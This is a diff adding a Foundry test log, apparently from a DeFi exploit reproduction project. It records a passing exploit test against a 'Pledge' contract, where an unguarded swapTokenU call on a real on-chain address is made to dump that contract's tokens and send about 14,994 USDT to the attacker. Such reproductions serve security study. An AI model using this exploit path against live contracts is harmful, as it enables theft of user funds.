@@ -1,0 +1,61 @@
+No files changed, compilation skipped
+
+Ran 1 test for src/test/2024-12/Pledge_exp.sol:Pledge
+[PASS] testExploit() (gas: 205333)
+Logs:
+  Attacker USDT Balance Before exploit: 0.000000000000000000
+  Attacker USDT Balance After exploit: 14994.304057738361451515
+
+Traces:
+  [212933] Pledge::testExploit()
+    ├─ [3081] 0x55d398326f99059fF775485246999027B3197955::symbol() [staticcall]
+    │   └─ ← [Return] "USDT"
+    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Pledge: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2425] 0x55d398326f99059fF775485246999027B3197955::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker USDT Balance Before exploit", val: 0, decimals: 18)
+    ├─ [2583] 0x4E5A19335017D69C986065B21e9dfE7965f84413::balanceOf(0x061944c0f3c2d7DABafB50813Efb05c4e0c952e1) [staticcall]
+    │   └─ ← [Return] 989644233342705000000000000 [9.896e26]
+    ├─ [167395] 0x061944c0f3c2d7DABafB50813Efb05c4e0c952e1::swapTokenU(989644233342705000000000000 [9.896e26], Pledge: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [24674] 0x4E5A19335017D69C986065B21e9dfE7965f84413::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: 0x061944c0f3c2d7DABafB50813Efb05c4e0c952e1, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   ├─ [131583] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(989644233342705000000000000 [9.896e26], 0, [0x4E5A19335017D69C986065B21e9dfE7965f84413, 0x55d398326f99059fF775485246999027B3197955], Pledge: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1733246836 [1.733e9])
+    │   │   ├─ [20806] 0x4E5A19335017D69C986065B21e9dfE7965f84413::transferFrom(0x061944c0f3c2d7DABafB50813Efb05c4e0c952e1, 0x8b98e36dFF7E5aD41b304FFF2aCf1D3D2368384A, 989644233342705000000000000 [9.896e26])
+    │   │   │   ├─ emit Transfer(from: 0x061944c0f3c2d7DABafB50813Efb05c4e0c952e1, to: 0x8b98e36dFF7E5aD41b304FFF2aCf1D3D2368384A, value: 989644233342705000000000000 [9.896e26])
+    │   │   │   ├─ emit Approval(owner: 0x061944c0f3c2d7DABafB50813Efb05c4e0c952e1, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665639574395224241302913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Pledge: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [2893] 0x8b98e36dFF7E5aD41b304FFF2aCf1D3D2368384A::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 375000000000000000000000 [3.75e23], 15000000000000000000000 [1.5e22], 1733246833 [1.733e9]
+    │   │   ├─ [583] 0x4E5A19335017D69C986065B21e9dfE7965f84413::balanceOf(0x8b98e36dFF7E5aD41b304FFF2aCf1D3D2368384A) [staticcall]
+    │   │   │   └─ ← [Return] 990019233342705000000000000 [9.9e26]
+    │   │   ├─ [96597] 0x8b98e36dFF7E5aD41b304FFF2aCf1D3D2368384A::swap(0, 14994304057738361451515 [1.499e22], Pledge: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [27971] 0x55d398326f99059fF775485246999027B3197955::transfer(Pledge: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14994304057738361451515 [1.499e22])
+    │   │   │   │   ├─ emit Transfer(from: 0x8b98e36dFF7E5aD41b304FFF2aCf1D3D2368384A, to: Pledge: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 14994304057738361451515 [1.499e22])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [583] 0x4E5A19335017D69C986065B21e9dfE7965f84413::balanceOf(0x8b98e36dFF7E5aD41b304FFF2aCf1D3D2368384A) [staticcall]
+    │   │   │   │   └─ ← [Return] 990019233342705000000000000 [9.9e26]
+    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x8b98e36dFF7E5aD41b304FFF2aCf1D3D2368384A) [staticcall]
+    │   │   │   │   └─ ← [Return] 5695942261638548485 [5.695e18]
+    │   │   │   ├─ emit Sync(reserve0: 990019233342705000000000000 [9.9e26], reserve1: 5695942261638548485 [5.695e18])
+    │   │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 989644233342705000000000000 [9.896e26], amount1In: 0, amount0Out: 0, amount1Out: 14994304057738361451515 [1.499e22], to: Pledge: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Pledge: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 14994304057738361451515 [1.499e22]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [1081] 0x55d398326f99059fF775485246999027B3197955::symbol() [staticcall]
+    │   └─ ← [Return] "USDT"
+    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Pledge: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 14994304057738361451515 [1.499e22]
+    ├─ [425] 0x55d398326f99059fF775485246999027B3197955::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker USDT Balance After exploit", val: 14994304057738361451515 [1.499e22], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 287.33ms (2.31ms CPU time)
+
+Ran 1 test suite in 298.12ms (287.33ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
